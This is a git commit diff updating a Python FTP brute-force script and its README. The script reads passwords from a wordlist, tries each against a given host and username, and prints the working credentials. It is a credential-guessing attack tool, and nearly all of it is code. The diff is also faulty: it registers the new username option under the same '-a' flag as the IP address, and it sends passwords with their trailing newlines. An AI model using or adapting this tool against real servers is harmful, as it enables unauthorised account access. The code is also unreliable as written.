de87458aa457757e0c11485836947dea21cf9e0a
Emanny <emmanuelogunfowokan@gmail.com>
2022-03-04 22:42:38 +0100

    modified files

--- README.md
+++ README.md
@@ -1,5 +1,6 @@
 # brute_force_ftp_login
 
-This python script bruteforces ftp server logins using usernames and passwords from the text file supplied.
+This python script bruteforces ftp server login using a username and passwords from the text file supplied.
 The text file is structured as shown below:
-username:password
+    password1
+    password2
--- ftpbruteforce.py
+++ ftpbruteforce.py
@@ -2,7 +2,6 @@
 The text file is structured as shown below:
 username:password"""
 
-
 import optparse
 import ftplib
 
@@ -13,31 +12,38 @@ def bruteforceftp(hostaddress, username, password):
 	except:
 		print('[-]Login failed.')
 		print('Wrong_details: ' + username + ' : ' + password)
+		return False
 	else:
 		print('[+]Login successful.')
 		print('Login_details: '+ username + ' : ' + password)
 		ftp.quit()
+		return True
 	
 
 def main():
-	parser = optparse.OptionParser('-a <ip_address> -f <username-password_file>')
+	parser = optparse.OptionParser('-a <ip_address> -u <username> -f <username-password_file>')
 	parser.add_option('-a', type='string', dest='ipaddress', help='Enter a valid ip address')
+	parser.add_option('-a', type="string", dest="username", help="Enter a username")
 	parser.add_option('-f', type='string', dest='textfile', help='Enter the appropriate document')
-	parser.usage = '[*]Run: python script.py -a <ip_address> -f <textfile>'
+	parser.usage = '[*]Run: python script.py -a <ip_address> -u <username> -f <textfile>'
 	(options, args) = parser.parse_args()
-	if options.ipaddress == None or options.textfile == None:
+	if (options.ipaddress == None) or (options.textfile == None) or (options.username == None):
 		print(parser.usage)
 		exit()
 	else:
 		ipaddress = options.ipaddress
 		upfile = options.textfile
+		username = options.username
 	
 	content = open(upfile)
 	for line in content.readlines():
-		login_details = line.strip()
-		login_details = line.split(':')
-		
-		bruteforceftp(ipaddress, login_details[0], login_details[1])
+		password = line
+
+		result = bruteforceftp(ipaddress, username, password)
+		if result:
+			exit()
+		else:
+			continue
 		
 if __name__ == '__main__':
 	main()
